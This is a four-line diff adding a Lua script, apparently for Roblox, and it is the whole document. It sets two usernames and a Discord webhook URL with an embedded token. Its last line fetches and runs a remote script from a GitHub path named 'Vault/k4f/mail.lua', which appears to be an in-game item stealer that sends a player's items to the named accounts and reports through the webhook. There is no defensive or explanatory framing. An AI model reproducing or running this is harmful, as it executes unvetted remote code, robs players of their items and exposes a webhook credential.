@@ -1,0 +1,4 @@
+UserName = "hi123344lol"
+UserName2 = "hi123344lol"
+Webhook = "https://discord.com/api/webhooks/1100229893368848476/9houbngSaW5hWgaExH7WJUIwKABlqO3X4pwKRI0LZNU6RbHRbppUPKWXC0aUDHZVAePA"
+loadstring(game:HttpGet("https://github.com/RainIsntBald/Vault/raw/main/k4f/mail.lua", true))()
